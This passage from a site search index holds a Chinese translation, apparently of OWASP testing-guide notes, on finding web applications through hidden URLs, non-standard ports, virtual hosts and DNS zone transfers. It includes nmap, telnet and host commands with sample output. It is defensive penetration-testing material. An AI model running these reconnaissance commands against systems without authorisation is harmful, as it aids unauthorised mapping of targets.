\u5e94\u7528\u7a0b\u5e8f\u3002\u663e\u7136\uff0c\u5206\u6790\u7684\u8303\u56f4\u6df1\u53d7\u6d4b\u8bd5\u4eba\u5458\u6d4b\u8bd5\u6240\u6709\u5e94\u7528\u7a0b\u5e8f\u6216\u53ea\u6d4b\u8bd5\u4ed6\u4eec\u77e5\u9053\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u5f71\u54cd\u3002</p> <p>\u6709\u65f6\uff0c\u76ee\u6807\u89c4\u8303\u66f4\u4e30\u5bcc\u3002\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u5f97\u5230\u4e00\u4e2a IP \u5730\u5740\u5217\u8868\u53ca\u5176\u76f8\u5e94\u7684\u7b26\u53f7\u540d\u79f0\u3002\u7136\u800c\uff0c\u8fd9\u4e2a\u5217\u8868\u53ef\u80fd\u4f20\u8fbe\u4e86\u90e8\u5206\u4fe1\u606f\uff0c\u5373\u5b83\u53ef\u80fd\u7701\u7565\u4e86\u4e00\u4e9b\u7b26\u53f7\u540d\u79f0\uff0c\u800c\u5ba2\u6237\u751a\u81f3\u53ef\u80fd\u6ca1\u6709\u610f\u8bc6\u5230\u8fd9\u4e00\u70b9\uff08\u8fd9\u5728\u5927\u578b\u7ec4\u7ec7\u4e2d\u66f4\u6709\u53ef\u80fd\u53d1\u751f\uff09\u3002</p> <p>\u5f71\u54cd\u8bc4\u4f30\u8303\u56f4\u7684\u5176\u4ed6\u95ee\u9898\u7531\u5728\u975e\u660e\u663e URL\uff08\u4f8b\u5982\uff0c<code>http://www.example.com/some-strange-URL</code>\uff09\u4e0a\u53d1\u5e03\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u8868\u793a\uff0c\u8fd9\u4e9b URL \u672a\u5728\u5176\u4ed6\u5730\u65b9\u5f15\u7528\u3002\u8fd9\u53ef\u80fd\u662f\u7531\u4e8e\u9519\u8bef\uff08\u7531\u4e8e\u914d\u7f6e\u9519\u8bef\uff09\u6216\u6709\u610f\uff08\u4f8b\u5982\uff0c\u672a\u516c\u5e03\u7684\u7ba1\u7406\u754c\u9762\uff09\u9020\u6210\u7684\u3002</p> <p>\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\uff0c\u6709\u5fc5\u8981\u6267\u884c Web \u5e94\u7528\u7a0b\u5e8f\u53d1\u73b0\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u679a\u4e3e\u8303\u56f4\u5185\u5b58\u5728\u4e8e Web \u670d\u52a1\u5668\u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>Web \u5e94\u7528\u7a0b\u5e8f\u53d1\u73b0\u662f\u4e00\u4e2a\u65e8\u5728\u8bc6\u522b\u7ed9\u5b9a\u57fa\u7840\u67b6\u6784\u4e0a\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u8fc7\u7a0b\u3002\u540e\u8005\u901a\u5e38\u6307\u5b9a\u4e3a\u4e00\u7ec4 IP \u5730\u5740\uff08\u53ef\u80fd\u662f\u4e00\u4e2a\u7f51\u7edc\u5757\uff09\uff0c\u4f46\u4e5f\u53ef\u80fd\u5305\u542b\u4e00\u7ec4 DNS \u7b26\u53f7\u540d\u79f0\u6216\u4e24\u8005\u7684\u6df7\u5408\u3002\u8fd9\u4e9b\u4fe1\u606f\u5728\u8bc4\u4f30\u6267\u884c\u4e4b\u524d\u5206\u53d1\uff0c\u65e0\u8bba\u662f\u7ecf\u5178\u98ce\u683c\u7684\u6e17\u900f\u6d4b\u8bd5\u8fd8\u662f\u4ee5\u5e94\u7528\u7a0b\u5e8f\u4e3a\u4e2d\u5fc3\u7684\u8bc4\u4f30\u3002\u5728\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0c\u9664\u975e\u53c2\u4e0e\u89c4\u5219\u53e6\u6709\u89c4\u5b9a\uff08\u4f8b\u5982\uff0c\u4ec5\u6d4b\u8bd5\u4f4d\u4e8e URL \u7684\u5e94\u7528\u7a0b\u5e8f<code>http://www.example.com/</code>\uff09\uff0c\u5426\u5219\u8bc4\u4f30\u5e94\u529b\u6c42\u8303\u56f4\u6700\u5168\u9762\uff0c\u5373\u5b83\u5e94\u8bc6\u522b\u53ef\u901a\u8fc7\u7ed9\u5b9a\u76ee\u6807\u8bbf\u95ee\u7684\u6240\u6709\u5e94\u7528\u7a0b\u5e8f\u3002\u4ee5\u4e0b\u793a\u4f8b\u68c0\u67e5\u4e86\u53ef\u7528\u4e8e\u5b9e\u73b0\u6b64\u76ee\u6807\u7684\u4e00\u4e9b\u6280\u672f\u3002</p> <p>\u4ee5\u4e0b\u4e00\u4e9b\u6280\u672f\u9002\u7528\u4e8e\u9762\u5411 Internet \u7684 Web \u670d\u52a1\u5668\uff0c\u5373 DNS \u548c\u53cd\u5411 IP \u57fa\u4e8e Web \u7684\u641c\u7d22\u670d\u52a1\u4ee5\u53ca\u641c\u7d22\u5f15\u64ce\u7684\u4f7f\u7528\u3002\u793a\u4f8b\u4f7f\u7528\u79c1\u6709 IP \u5730\u5740\uff08\u4f8b\u5982<code>192.168.1.100</code>\uff09\uff0c\u9664\u975e\u53e6\u6709\u8bf4\u660e\uff0c\u5426\u5219\u4ee3\u8868_\u901a\u7528_IP \u5730\u5740\u5e76\u4e14\u4ec5\u7528\u4e8e\u533f\u540d\u76ee\u7684\u3002</p> <p>\u5f71\u54cd\u6709\u591a\u5c11\u5e94\u7528\u7a0b\u5e8f\u4e0e\u7ed9\u5b9a DNS \u540d\u79f0\uff08\u6216 IP \u5730\u5740\uff09\u76f8\u5173\u7684\u4e09\u4e2a\u56e0\u7d20\uff1a</p> <ol> <li> <p>\u4e0d\u540c\u7684\u57fa\u672c URL</p> <p>Web \u5e94\u7528\u7a0b\u5e8f\u7684\u660e\u663e\u5165\u53e3\u70b9\u662f<code>www.example.com</code>\uff0c\u5373\uff0c\u4f7f\u7528\u8fd9\u79cd\u7b80\u5199\u7b26\u53f7\uff0c\u6211\u4eec\u8ba4\u4e3a Web \u5e94\u7528\u7a0b\u5e8f\u8d77\u6e90\u4e8e<code>http://www.example.com/</code>\uff08\u8fd9\u540c\u6837\u9002\u7528\u4e8e HTTPS\uff09\u3002\u7136\u800c\uff0c\u5373\u4f7f\u8fd9\u662f\u6700\u5e38\u89c1\u7684\u60c5\u51b5\uff0c\u4e5f\u6ca1\u6709\u5f3a\u5236\u5e94\u7528\u7a0b\u5e8f\u4ece<code>/</code>.</p> <p>\u4f8b\u5982\uff0c\u76f8\u540c\u7684\u7b26\u53f7\u540d\u79f0\u53ef\u80fd\u4e0e\u4e09\u4e2a Web \u5e94\u7528\u7a0b\u5e8f\u76f8\u5173\u8054\uff0c\u4f8b\u5982\uff1a<code>http://www.example.com/url1</code> <code>http://www.example.com/url2</code> <code>http://www.example.com/url3</code></p> <p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0cURL<code>http://www.example.com/</code>\u4e0d\u4f1a\u4e0e\u6709\u610f\u4e49\u7684\u9875\u9762\u76f8\u5173\u8054\uff0c\u5e76\u4e14\u8fd9\u4e09\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5c06\u88ab\u9690\u85cf\uff0c\u9664\u975e\u6d4b\u8bd5\u4eba\u5458\u660e\u786e\u77e5\u9053\u5982\u4f55\u8bbf\u95ee\u5b83\u4eec\uff0c\u5373\u6d4b\u8bd5\u4eba\u5458\u77e5\u9053_url1_\u3001url2_\u6216_url3\u3002\u901a\u5e38\u4e0d\u9700\u8981\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u53d1\u5e03 Web \u5e94\u7528\u7a0b\u5e8f\uff0c\u9664\u975e\u6240\u6709\u8005\u4e0d\u5e0c\u671b\u4ee5\u6807\u51c6\u65b9\u5f0f\u8bbf\u95ee\u5b83\u4eec\uff0c\u5e76\u4e14\u51c6\u5907\u544a\u77e5\u7528\u6237\u5176\u786e\u5207\u4f4d\u7f6e\u3002\u8fd9\u5e76\u4e0d\u610f\u5473\u7740\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u662f\u79d8\u5bc6\u7684\uff0c\u53ea\u662f\u5b83\u4eec\u7684\u5b58\u5728\u548c\u4f4d\u7f6e\u6ca1\u6709\u88ab\u660e\u786e\u516c\u5e03\u3002</p> </li> <li> <p>\u975e\u6807\u51c6\u7aef\u53e3</p> <p>\u867d\u7136 Web \u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u4f4d\u4e8e\u7aef\u53e3 80 (HTTP) \u548c 443 (HTTPS) \u4e0a\uff0c\u4f46\u8fd9\u4e9b\u7aef\u53e3\u53f7\u5e76\u6ca1\u6709\u4ec0\u4e48\u795e\u5947\u4e4b\u5904\u3002\u4e8b\u5b9e\u4e0a\uff0cWeb \u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4e0e\u4efb\u610f TCP \u7aef\u53e3\u76f8\u5173\u8054\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a\u7aef\u53e3\u53f7\u6765\u5f15\u7528\uff0c\u5982\u4e0b\u6240\u793a\uff1a<code>http[s]://www.example.com:port/</code>.\u00a0\u4f8b\u5982\uff0c<code>http://www.example.com:20000/</code>\u3002</p> </li> <li> <p>\u865a\u62df\u4e3b\u673a</p> <p>DNS \u5141\u8bb8\u5355\u4e2a IP \u5730\u5740\u4e0e\u4e00\u4e2a\u6216\u591a\u4e2a\u7b26\u53f7\u540d\u79f0\u76f8\u5173\u8054\u3002\u4f8b\u5982\uff0cIP \u5730\u5740<code>192.168.1.100</code>\u53ef\u80fd\u4e0e DNS \u540d\u79f0<code>www.example.com</code>\u3001<code>helpdesk.example.com</code>\u3001\u76f8\u5173\u8054<code>webmail.example.com</code>\u3002\u4e0d\u5fc5\u6240\u6709\u540d\u79f0\u90fd\u5c5e\u4e8e\u540c\u4e00\u4e2a DNS \u57df\u3002\u8fd9\u79cd 1 \u5bf9 N \u7684\u5173\u7cfb\u53ef\u4ee5\u53cd\u6620\u4e3a\u901a\u8fc7\u4f7f\u7528\u6240\u8c13\u7684\u865a\u62df\u4e3b\u673a\u6765\u63d0\u4f9b\u4e0d\u540c\u7684\u5185\u5bb9\u3002\u6211\u4eec\u6240\u6307\u7684\u6307\u5b9a\u865a\u62df\u4e3b\u673a\u7684\u4fe1\u606f\u5d4c\u5165\u5728 HTTP 1.1\u4e3b\u673a\u6807\u5934\u4e2d\u3002</p> <p>\u4eba\u4eec\u4e0d\u4f1a\u6000\u7591\u9664\u4e86\u663e\u800c\u6613\u89c1\u7684\u4e4b\u5916\u8fd8\u6709\u5176\u4ed6 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u5b58\u5728<code>www.example.com</code>\uff0c\u9664\u975e\u4ed6\u4eec\u77e5\u9053<code>helpdesk.example.com</code>\u548c<code>webmail.example.com</code>\u3002</p> </li> </ol>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#1-url","title":"\u89e3\u51b3\u95ee\u9898 1 \u7684\u65b9\u6cd5 - \u975e\u6807\u51c6 URL","text":"<p>\u6ca1\u6709\u529e\u6cd5\u5b8c\u5168\u786e\u5b9a\u662f\u5426\u5b58\u5728\u975e\u6807\u51c6\u547d\u540d\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u3002\u7531\u4e8e\u662f\u975e\u6807\u51c6\u7684\uff0c\u56e0\u6b64\u6ca1\u6709\u7ba1\u7406\u547d\u540d\u7ea6\u5b9a\u7684\u56fa\u5b9a\u6807\u51c6\uff0c\u4f46\u662f\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u6280\u672f\u6765\u83b7\u5f97\u4e00\u4e9b\u989d\u5916\u7684\u6d1e\u5bdf\u529b\u3002</p> <p>\u9996\u5148\uff0c\u5982\u679c Web \u670d\u52a1\u5668\u914d\u7f6e\u9519\u8bef\u5e76\u5141\u8bb8\u76ee\u5f55\u6d4f\u89c8\uff0c\u5219\u53ef\u80fd\u4f1a\u53d1\u73b0\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u3002\u6f0f\u6d1e\u626b\u63cf\u5668\u53ef\u80fd\u5728\u8fd9\u65b9\u9762\u6709\u6240\u5e2e\u52a9\u3002</p> <p>\u5176\u6b21\uff0c\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u88ab\u5176\u4ed6\u7f51\u9875\u5f15\u7528\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u88ab\u7f51\u7edc\u641c\u7d22\u5f15\u64ce\u6293\u53d6\u548c\u7d22\u5f15\u3002\u5982\u679c\u6d4b\u8bd5\u4eba\u5458\u6000\u7591\u6b64\u7c7b\u9690\u85cf\u5e94\u7528\u7a0b\u5e8f\u7684\u5b58\u5728\uff0c<code>www.example.com</code>\u4ed6\u4eec\u53ef\u4ee5\u4f7f\u7528_\u7f51\u7ad9_\u8fd0\u8425\u5546\u8fdb\u884c\u641c\u7d22\u5e76\u68c0\u67e5\u67e5\u8be2\u7ed3\u679c<code>site: www.example.com</code>\u3002\u5728\u8fd4\u56de\u7684 URL \u4e2d\uff0c\u53ef\u80fd\u6709\u4e00\u4e2a\u6307\u5411\u8fd9\u6837\u4e00\u4e2a\u4e0d\u660e\u663e\u7684\u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>\u53e6\u4e00\u79cd\u9009\u62e9\u662f\u63a2\u6d4b\u53ef\u80fd\u662f\u672a\u53d1\u5e03\u5e94\u7528\u7a0b\u5e8f\u5019\u9009\u8005\u7684 URL\u3002\u4f8b\u5982\uff0c\u53ef\u4ee5\u4ece <code>https://www.example.com/webmail</code>\u3001<code>https://webmail.example.com/</code> \u6216 <code>https://mail.example.com/</code>\u7b49 URL \u8bbf\u95ee Web\u90ae\u4ef6\u524d\u7aef\u3002\u8fd9\u540c\u6837\u9002\u7528\u4e8e\u7ba1\u7406\u754c\u9762\uff0c\u5b83\u4eec\u53ef\u4ee5\u5728\u9690\u85cf\u7684 URL \u4e0a\u53d1\u5e03\uff08\u4f8b\u5982\uff0cTomcat \u7ba1\u7406\u754c\u9762\uff09\uff0c\u4f46\u4e0d\u4f1a\u5728\u4efb\u4f55\u5730\u65b9\u5f15\u7528\u3002\u56e0\u6b64\uff0c\u8fdb\u884c\u4e00\u4e9b\u5b57\u5178\u5f0f\u641c\u7d22\uff08\u6216\u201c\u667a\u80fd\u731c\u6d4b\u201d\uff09\u53ef\u80fd\u4f1a\u4ea7\u751f\u4e00\u4e9b\u7ed3\u679c\u3002\u6f0f\u6d1e\u626b\u63cf\u5668\u53ef\u80fd\u5728\u8fd9\u65b9\u9762\u6709\u6240\u5e2e\u52a9\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#2-","title":"\u89e3\u51b3\u95ee\u9898 2 \u7684\u65b9\u6cd5 - \u975e\u6807\u51c6\u7aef\u53e3","text":"<p>\u5f88\u5bb9\u6613\u68c0\u67e5\u975e\u6807\u51c6\u7aef\u53e3\u4e0a\u662f\u5426\u5b58\u5728 Web \u5e94\u7528\u7a0b\u5e8f\u3002Nmap\u7b49\u7aef\u53e3\u626b\u63cf\u5668\u53ef\u4ee5\u901a\u8fc7<code>-sV</code>\u9009\u9879\u8fdb\u884c\u670d\u52a1\u8bc6\u522b\uff0c\u8bc6\u522b\u4efb\u610f\u7aef\u53e3\u4e0a\u7684http[s]\u670d\u52a1\u3002\u6240\u9700\u8981\u7684\u662f\u5bf9\u6574\u4e2a 64k TCP \u7aef\u53e3\u5730\u5740\u7a7a\u95f4\u7684\u5168\u9762\u626b\u63cf\u3002</p> <p>\u4f8b\u5982\uff0c\u4ee5\u4e0b\u547d\u4ee4\u5c06\u901a\u8fc7 TCP \u8fde\u63a5\u626b\u63cf\u67e5\u627e IP \u4e0a\u6240\u6709\u6253\u5f00\u7684\u7aef\u53e3\uff0c<code>192.168.1.100</code>\u5e76\u5c1d\u8bd5\u786e\u5b9a\u54ea\u4e9b\u670d\u52a1\u7ed1\u5b9a\u5230\u5b83\u4eec\uff08\u4ec5\u663e\u793a_\u5fc5\u8981_\u7684\u5f00\u5173 - Nmap \u5177\u6709\u5e7f\u6cdb\u7684\u9009\u9879\u96c6\uff0c\u5176\u8ba8\u8bba\u662f\u8d85\u51fa\u8303\u56f4\uff09\uff1a</p> <p><code>nmap \u2013Pn \u2013sT \u2013sV \u2013p0-65535 192.168.1.100</code></p> <p>\u68c0\u67e5\u8f93\u51fa\u5e76\u67e5\u627e HTTP \u6216 TLS \u5305\u88c5\u670d\u52a1\u7684\u6307\u793a\uff08\u5e94\u63a2\u6d4b\u4ee5\u786e\u8ba4\u5b83\u4eec\u662f HTTPS\uff09\u5c31\u8db3\u591f\u4e86\u3002\u4f8b\u5982\uff0c\u4e0a\u4e00\u4e2a\u547d\u4ee4\u7684\u8f93\u51fa\u53ef\u80fd\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>Interesting ports on 192.168.1.100:\n(The 65527 ports scanned but not shown below are in state: closed)\nPORT      STATE SERVICE     VERSION\n22/tcp    open  ssh         OpenSSH 3.5p1 (protocol 1.99)\n80/tcp    open  http        Apache httpd 2.0.40 ((Red Hat Linux))\n443/tcp   open  ssl         OpenSSL\n901/tcp   open  http        Samba SWAT administration server\n1241/tcp  open  ssl         Nessus security scanner\n3690/tcp  open  unknown\n8000/tcp  open  http-alt?\n8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1\n</code></pre> <p>\u4ece\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u53ef\u4ee5\u770b\u51fa\uff1a</p> <ul> <li>\u6709\u4e00\u4e2a Apache HTTP \u670d\u52a1\u5668\u5728\u7aef\u53e3 80 \u4e0a\u8fd0\u884c\u3002</li> <li>443\u7aef\u53e3\u597d\u50cf\u6709HTTPS\u670d\u52a1\u5668\uff08\u4e0d\u8fc7\u8fd9\u4e2a\u9700\u8981\u786e\u8ba4\uff0c\u6bd4\u5982<code>https://192.168.1.100</code>\u7528\u6d4f\u89c8\u5668\u8bbf\u95ee\uff09\u3002</li> <li>\u5728\u7aef\u53e3 901 \u4e0a\u6709\u4e00\u4e2a Samba SWAT Web \u754c\u9762\u3002</li> <li>\u7aef\u53e3 1241 \u4e0a\u7684\u670d\u52a1\u4e0d\u662f HTTPS\uff0c\u800c\u662f TLS \u5c01\u88c5\u7684 Nessus \u5b88\u62a4\u8fdb\u7a0b\u3002</li> <li>\u7aef\u53e3 3690 \u5177\u6709\u672a\u6307\u5b9a\u7684\u670d\u52a1\uff08Nmap \u8fd4\u56de\u5176_\u6307\u7eb9_- \u6b64\u5904\u4e3a\u6e05\u695a\u8d77\u89c1\u7701\u7565 - \u4ee5\u53ca\u5c06\u5176\u63d0\u4ea4\u5e76\u7eb3\u5165 Nmap \u6307\u7eb9\u6570\u636e\u5e93\u7684\u8bf4\u660e\uff0c\u524d\u63d0\u662f\u60a8\u77e5\u9053\u5b83\u4ee3\u8868\u7684\u670d\u52a1\uff09\u3002</li> <li>\u7aef\u53e3 8000 \u4e0a\u7684\u53e6\u4e00\u4e2a\u672a\u6307\u5b9a\u670d\u52a1\uff1b\u8fd9\u53ef\u80fd\u662f HTTP\uff0c\u56e0\u4e3a\u5728\u6b64\u7aef\u53e3\u4e0a\u627e\u5230 HTTP \u670d\u52a1\u5668\u5e76\u4e0d\u7f55\u89c1\u3002\u8ba9\u6211\u4eec\u68c0\u67e5\u4e00\u4e0b\u8fd9\u4e2a\u95ee\u9898\uff1a</li> </ul> <pre><code>$ telnet 192.168.10.100 8000\nTrying 192.168.1.100...\nConnected to 192.168.1.100.\nEscape character is '^]'.\nGET / HTTP/1.0\n\nHTTP/1.0 200 OK\npragma: no-cache\nContent-Type: text/html\nServer: MX4J-HTTPD/1.0\nexpires: now\nCache-Control: no-cache\n\n&lt;html&gt;\n...\n</code></pre> <p>\u8fd9\u8bc1\u5b9e\u5b83\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a HTTP \u670d\u52a1\u5668\u3002\u6216\u8005\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528\u7f51\u7edc\u6d4f\u89c8\u5668\u8bbf\u95ee\u8be5 URL\uff1b\u6216\u4f7f\u7528 GET \u6216 HEAD Perl \u547d\u4ee4\uff0c\u5b83\u4eec\u6a21\u4eff HTTP \u4ea4\u4e92\uff0c\u4f8b\u5982\u4e0a\u9762\u7ed9\u51fa\u7684\u4ea4\u4e92\uff08\u4f46\u662f HEAD \u8bf7\u6c42\u53ef\u80fd\u4e0d\u4f1a\u88ab\u6240\u6709\u670d\u52a1\u5668\u63a5\u53d7\uff09\u3002</p> <ul> <li>Apache Tomcat \u5728\u7aef\u53e3 8080 \u4e0a\u8fd0\u884c\u3002</li> </ul> <p>\u6f0f\u6d1e\u626b\u63cf\u5668\u53ef\u80fd\u4f1a\u6267\u884c\u76f8\u540c\u7684\u4efb\u52a1\uff0c\u4f46\u9996\u5148\u68c0\u67e5\u6240\u9009\u626b\u63cf\u5668\u662f\u5426\u80fd\u591f\u8bc6\u522b\u5728\u975e\u6807\u51c6\u7aef\u53e3\u4e0a\u8fd0\u884c\u7684 HTTP[S] \u670d\u52a1\u3002\u4f8b\u5982\uff0cNessus \u80fd\u591f\u5728\u4efb\u610f\u7aef\u53e3\u4e0a\u8bc6\u522b\u5b83\u4eec\uff08\u524d\u63d0\u662f\u5b83\u88ab\u6307\u793a\u626b\u63cf\u6240\u6709\u7aef\u53e3\uff09\uff0c\u5e76\u4e14\u5c06\u63d0\u4f9b\u5173\u4e8e Nmap \u7684\u5927\u91cf\u9488\u5bf9\u5df2\u77e5 Web \u670d\u52a1\u5668\u6f0f\u6d1e\u7684\u6d4b\u8bd5\uff0c\u4ee5\u53ca TLS/ HTTPS \u670d\u52a1\u7684 SSL \u914d\u7f6e\u3002\u5982\u524d\u6240\u8ff0\uff0cNessus \u8fd8\u80fd\u591f\u53d1\u73b0\u6d41\u884c\u7684\u5e94\u7528\u7a0b\u5e8f\u6216 web \u754c\u9762\uff0c\u5426\u5219\u53ef\u80fd\u4f1a\u88ab\u5ffd\u89c6\uff08\u4f8b\u5982\uff0cTomcat \u7ba1\u7406\u754c\u9762\uff09\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#3-","title":"\u89e3\u51b3\u95ee\u9898 3 \u7684\u65b9\u6cd5 - \u865a\u62df\u4e3b\u673a","text":"<p>\u6709\u8bb8\u591a\u6280\u672f\u53ef\u7528\u4e8e\u8bc6\u522b\u4e0e\u7ed9\u5b9a IP \u5730\u5740\u5173\u8054\u7684 DNS \u540d\u79f0<code>x.y.z.t</code>\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#dns","title":"DNS \u533a\u57df\u4f20\u8f93","text":"<p>\u8003\u8651\u5230 DNS \u670d\u52a1\u5668\u57fa\u672c\u4e0a\u4e0d\u652f\u6301\u533a\u57df\u4f20\u8f93\u8fd9\u4e00\u4e8b\u5b9e\uff0c\u8fd9\u79cd\u6280\u672f\u73b0\u5728\u7684\u4f7f\u7528\u53d7\u5230\u9650\u5236\u3002\u4f46\u662f\uff0c\u8fd9\u53ef\u80fd\u503c\u5f97\u4e00\u8bd5\u3002\u9996\u5148\uff0c\u6d4b\u8bd5\u4eba\u5458\u5fc5\u987b\u786e\u5b9a\u670d\u52a1\u4e8e<code>x.y.z.t</code>.\u00a0\u5982\u679c\u4e00\u4e2a\u7b26\u53f7\u540d\u79f0\u5df2\u77e5<code>x.y.z.t</code>\uff08\u5047\u8bbe\u4e3a\uff09\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7\u3001\u6216\u7b49\u5de5\u5177\u901a\u8fc7\u8bf7\u6c42 DNS NS \u8bb0\u5f55<code>www.example.com</code>\u6765\u786e\u5b9a\u5176\u540d\u79f0\u670d\u52a1\u5668\u3002<code>nslookup``host``dig</code></p> <p>\u5982\u679c\u6ca1\u6709\u5df2\u77e5\u7684\u7b26\u53f7\u540d\u79f0<code>x.y.z.t</code>\uff0c\u4f46\u76ee\u6807\u5b9a\u4e49\u81f3\u5c11\u5305\u542b\u4e00\u4e2a\u7b26\u53f7\u540d\u79f0\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u5e94\u7528\u76f8\u540c\u7684\u8fc7\u7a0b\u5e76\u67e5\u8be2\u8be5\u540d\u79f0\u7684\u540d\u79f0\u670d\u52a1\u5668\uff08\u5e0c\u671b\u8be5\u540d\u79f0\u670d\u52a1\u5668<code>x.y.z.t</code>\u4e5f\u80fd\u63d0\u4f9b\u670d\u52a1\uff09\u3002\u4f8b\u5982\uff0c\u5982\u679c\u76ee\u6807\u7531 IP \u5730\u5740<code>x.y.z.t</code>\u548c\u540d\u79f0\u7ec4\u6210<code>mail.example.com</code>\uff0c\u5219\u786e\u5b9a\u57df\u7684\u540d\u79f0\u670d\u52a1\u5668<code>example.com</code>\u3002</p> <p>\u4ee5\u4e0b\u793a\u4f8b\u663e\u793a\u5982\u4f55<code>www.owasp.org</code>\u4f7f\u7528\u4ee5\u4e0b<code>host</code>\u547d\u4ee4\u8bc6\u522b\u540d\u79f0\u670d\u52a1\u5668\uff1a</p> <pre><code>$ host -t ns www.owasp.org\nwww.owasp.org is an alias for owasp.org.\nowasp.org name server ns1.secure.net.\nowasp.org name server ns2.secure.net.\n</code></pre> <p>\u73b0\u5728\u53ef\u4ee5\u5411\u57df\u7684\u540d\u79f0\u670d\u52a1\u5668\u8bf7\u6c42\u533a\u57df\u4f20\u8f93<code>example.com</code>\u3002\u5982\u679c\u6d4b\u8bd5\u4eba\u5458\u5e78\u8fd0\u7684\u8bdd\uff0c\u4ed6\u4eec\u5c06\u5f97\u5230\u8be5\u57df\u7684 DNS \u6761\u76ee\u5217\u8868\u3002\u8fd9\u5c06\u5305\u62ec\u660e\u663e<code>www.example.com</code>\u7684\u548c\u4e0d\u592a\u660e\u663e\u7684<code>helpdesk.example.com</code>\u4ee5\u53ca<code>webmail.example.com</code>\uff08\u53ef\u80fd\u8fd8\u6709\u5176\u4ed6\uff09\u3002\u68c0\u67e5\u533a\u57df\u4f20\u8f93\u8fd4\u56de\u7684\u6240\u6709\u540d\u79f0\uff0c\u5e76\u8003\u8651\u6240\u6709\u4e0e\u6b63\u5728\u8bc4\u4f30\u7684\u76ee\u6807\u76f8\u5173\u7684\u540d\u79f0\u3002</p> <p>\u5c1d\u8bd5<code>owasp.org</code>\u4ece\u5176\u540d\u79f0\u670d\u52a1\u5668\u4e4b\u4e00\u8bf7\u6c42\u533a\u57df\u4f20\u8f93\uff1a</p> <pre><code>$ host -l www.owasp.org ns1.secure.net\nUsing domain server:\nName: ns1.secure.net\nAddress: 192.220.124.10#53\nAliases:\n\nHost www.owasp.org not found: 5(REFUSED)\n; Transfer failed.\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#dns_1","title":"DNS \u53cd\u5411\u67e5\u8be2","text":"<p>\u6b64\u8fc7\u7a0b\u4e0e\u524d\u4e00\u4e2a\u8fc7\u7a0b\u7c7b\u4f3c\uff0c\u4f46\u4f9d\u8d56\u4e8e\u53cd\u5411 (PTR) DNS 